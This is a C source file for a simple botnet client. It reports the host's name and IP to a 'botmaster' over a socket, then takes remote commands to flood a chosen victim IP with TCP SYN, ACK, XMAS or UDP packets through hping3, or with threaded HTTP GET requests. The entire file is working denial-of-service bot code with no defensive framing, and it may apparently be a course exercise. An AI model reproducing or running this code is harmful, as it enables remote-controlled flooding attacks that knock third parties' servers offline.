#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include<pthread.h>
#define MAX 10240
#define PORT 9999
#define SA struct sockaddr
void resp(int s, char*, long int);

void* httpthread(void* dstip)
{
	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;
	char sendline[MAX];
	char page[30];
	char host[30];

	// socket create and verification
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr((char*)dstip);
	servaddr.sin_port = htons(80);

	// connect the client socket to victim server socket
	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
		printf("connection with the server failed...\n");
		exit(0);
	}
	else
		printf("connected to the server..\n");


	//Send the HTTP get command
	write(sockfd, "GET /\r\n", strlen("GET /\r\n"));
	

	//Skip the returned message
	// close the socket
	shutdown(sockfd, SHUT_RDWR); 


	// close the socket
	close(sockfd);
	pthread_exit(NULL);
}


void httpdos(char* dstip, int count)
{
	pthread_t threadid[50];
	int i=0;
	count = count>50?50:count;

	//For each HTTP connection, we create a separate thread
	while(i<count)
	{
		pthread_create(&threadid[i], NULL, httpthread,dstip);
		i++;
	}
	int k=0;

	//Wait for all threads to terminate
	while(k<i)
	{
		pthread_join(threadid[k++],NULL);
	}
}
int execute(int s,char* cmd, char* dstip, int count)
{
	char statement[200];
	char response[10240], msg[10240];
	int length;

	//Create statement based on attack-type
	if(strcmp(cmd,"TCP-SYN")==0)
	{
		sprintf(statement,"hping3 %s --syn -c %d",dstip, count);

	}
	else if(strcmp(cmd, "TCP-ACK") == 0)
	{
		sprintf(statement,"hping3 %s --ack -c %d",dstip, count);
	}
	else if(strcmp(cmd, "TCP-XMAS") == 0)
	{
		sprintf(statement,"hping3 %s --xmas -c %d",dstip, count);
	}
	else if(strcmp(cmd, "UDP") == 0)
	{
		sprintf(statement, "hping3 -2 %s -c %d",dstip, count);
	}
	else if(strcmp(cmd,"HTTP") == 0)
	{
		//HTTP attack has to be done separately
		httpdos(dstip,count);
		sprintf(msg,"Success");
		resp(s,msg, sizeof(msg));
		return;
	}
	else
	{
		sprintf(msg,"Failure");
		resp(s,msg, sizeof(msg));
		return;
	}

	//In all other cases other than HTTP attack
	//execute and send success message
	FILE* fp = popen(statement,"r");
	if(fp == NULL)
	{
		printf("\nUnable to Spawn process");
		return -1;
	}
	bzero(msg,sizeof(msg));
	while(fgets(response,sizeof(response),fp)!=NULL)
	{
		strcat(msg,response);
	}
	sprintf(msg,"Success");
	resp(s,msg, sizeof(msg));
	pclose(fp);
	return;
}
int parse(int s, char* msg)
{
	char string[50];
	char* cmd, *dstip, *token;
	int count, n =0;
	strcpy(string, msg);

	//Extract the attack-type, IP and count fields from the command
	token = strtok(string, " ");
	while(token!=NULL)
	{
		switch(n)
		{
			case 1:
				cmd = strdup(token);
				break;
			case 2:
				dstip = strdup(token);
				break;
			case 3:
				count = atoi(token);
				break;
		}
		token = strtok(NULL," ");
		n++;
	}

	//If no error in number of tokens, execute the command
	if(n==4)
	{
		execute(s,cmd,dstip,count);
		return 0;
	}
	//Else return a failure message
	else
	{
		strcpy(string,"Failure");
		write(s,msg,strlen(msg));
		return 0;
	}
		

}
void resp(int s, char* msg,long int size)
{
	//bzero(msg,sizeof(msg));
	write(s,msg,size);
}

void check_host_entry(struct hostent * hostentry) { //find host info from host name
   if (hostentry == NULL) {
      perror("gethostbyname");
      exit(1);
   }
}
void func(int sockfd)
{
	char buff[MAX];
	char *temp = NULL;
	char* ip;
	struct hostent *host_entry;
	int n=5;

	//Obtain the hostname and ip of the device
	bzero(buff,sizeof(buff));
	gethostname(buff,sizeof(buff));
	host_entry = gethostbyname(buff);
	check_host_entry(host_entry);
	ip = inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0]));

	//Send the hostname to the botmaster
	resp(sockfd,buff,sizeof(buff));

	//Send the IP address to the botmaster
	bzero(buff,sizeof(buff));
	strcpy(buff,ip);
	resp(sockfd, ip, strlen(ip));


	for (;;) 
	{
		//Receive commands from the botmaster
		bzero(buff, sizeof(buff));
		read(sockfd, buff, sizeof(buff));
		printf("From Server,%d : %s", sizeof(buff),buff);
		if ((strncmp(buff, "exit", 4)) == 0) {
			printf("Client Exit...\n");
			break;
		}
		//Parse and execute the command
		parse(sockfd,buff);
	}
}

int main()
{
	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;

	// socket create and verfification
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servaddr.sin_port = htons(PORT);

	// connect the client socket to server socket
	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
		printf("connection with the server failed...\n");
		exit(0);
	}
	else
		printf("connected to the server..\n");

	// function for command
	func(sockfd);

	// close the socket
	close(sockfd);
}

